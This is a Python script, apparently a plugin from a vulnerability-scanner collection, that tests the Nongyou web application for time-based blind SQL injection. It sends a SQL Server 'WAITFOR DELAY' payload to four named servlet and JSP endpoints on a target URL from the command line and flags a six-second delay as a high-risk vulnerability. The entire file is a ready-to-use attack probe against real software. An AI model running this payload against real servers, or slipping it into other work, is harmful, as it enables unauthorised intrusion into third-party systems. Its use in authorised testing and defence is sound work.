#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 农友多处时间盲注
referer: http://www.wooyun.org/bugs/wooyun-2010-091294
         http://www.wooyun.org/bugs/wooyun-2010-0108912
author: Lucifer
description: 时间盲注。
'''
import sys
import time
import requests
import warnings
from termcolor import cprint

class nongyou_sleep_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        urls = ["/IMLoginServlet?pwd=1&uid=1'",
                "/persionTreeServlet?bmdm=1'",
                "/R9iPortal/cm/cm_info_list.jsp?itype_id=3",
                "/R9iPortal/cm/cm_notice_content.jsp?info_id=4"]
        payload = ";WaItFoR%20DeLaY%20%270:0:6%27--"
        start_time = time.time()
        try:
            noexist = True
            for turl in urls:
                vulnurl = self.url + turl + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if time.time() - start_time >= 6:
                    cprint("[+]存在农友多处时间盲注漏洞...(高危)\tpayload: "+vulnurl, "red")
                    return True, vulnurl, "农友多处时间盲注", payload, req.text
            if noexist:
                cprint("[-]不存在nongyou_sleep_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = nongyou_sleep_sqli_BaseVerify(sys.argv[1])
    testVuln.run()